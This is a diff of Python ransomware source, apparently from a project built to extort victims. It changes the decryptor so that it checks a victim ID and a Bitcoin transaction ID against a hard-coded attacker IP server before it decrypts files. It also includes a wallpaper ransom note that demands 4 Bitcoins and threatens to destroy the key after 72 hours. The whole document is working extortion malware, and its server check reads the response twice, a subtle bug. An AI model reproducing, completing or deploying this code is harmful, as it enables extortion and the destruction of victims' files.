@@ -95,14 +95,30 @@ def start_encrypting():
   setWallpaper(id)
 
 def start_decrypting():
-  password = raw_input("Enter password to decrypt files: ")
-  drives=[]
-  all_drives=psutil.disk_partitions()
-  for drive in all_drives:
-    if list(drive)[3]=='rw,fixed' and list(drive)[1][0] != 'C' :
-      drives.append(list(drive)[1][0])
-  for drive in drives:
-    for subdir, dirs, files in os.walk(drive+":/"):
+  id=raw_input("Enter your Unique ID : ")
+  tid  = raw_input("Enter your Transaction id : ")
+  response = urllib.urlopen("http://139.59.8.120?action=dec&id="+id+"&tid="+tid)
+  
+  if len(response.read()) == 16:
+    password=response.read()
+    drives=[]
+    all_drives=psutil.disk_partitions()
+    for drive in all_drives:
+      if list(drive)[3]=='rw,fixed' and list(drive)[1][0] != 'C' :
+        drives.append(list(drive)[1][0])
+    for drive in drives:
+      for subdir, dirs, files in os.walk(drive+":/"):
+          for file in files:
+              if "Pay_Ransom_Or_Forget_" in os.path.join(subdir, file):
+                try:
+                  print "Decrypting "+os.path.join(subdir, file)
+                  decrypt(getKey(password),os.path.join(subdir, file))
+                except Exception as e:
+                  print e
+                os.remove(os.path.join(subdir, file))
+
+
+    for subdir, dirs, files in os.walk("C:/Users/"+getpass.getuser()+"/Desktop/"):
         for file in files:
             if "Pay_Ransom_Or_Forget_" in os.path.join(subdir, file):
               try:
@@ -110,19 +126,10 @@ def start_decrypting():
                 decrypt(getKey(password),os.path.join(subdir, file))
               except Exception as e:
                 print e
-              os.remove(os.path.join(subdir, file))
-
-
-  for subdir, dirs, files in os.walk("C:/Users/"+getpass.getuser()+"/Desktop/"):
-      for file in files:
-          if "Pay_Ransom_Or_Forget_" in os.path.join(subdir, file):
-            try:
-              print "Decrypting "+os.path.join(subdir, file)
-              decrypt(getKey(password),os.path.join(subdir, file))
-            except Exception as e:
-              print e
-            os.remove(os.path.join(subdir, file))              
-
+              os.remove(os.path.join(subdir, file))              
+  else:
+    print "Verification failed..!!"
+    s=raw_input()
 def setWallpaper(id):
   text="All of your files are encrypted using strong AES encrytion Algorithm.\nYou will need the key to decrypt those files.\nThe key is generated specific to your computer and it\nresides on a secret server on the Internet. There is no other\nway to get your files back. The key will be destroyed after 72 hours\nfrom now. Then your files are as good as deleted.\n\nIn order to decrypt the files you can use the decryter that is\ncopied on your desktop. To obtain the key, transfer the amount of 4 Bitcoins to the\nbitcoin address: 1Bsba32bhHBj3hjb2BHxxsS \nEnter your unique victim id as '"+id+"' and the transaction id in the decrypter.\nThe transaction id will be verified and the you will recieve the key."
   font = ImageFont.truetype("C:/Windows/Fonts/Arial.ttf",50)
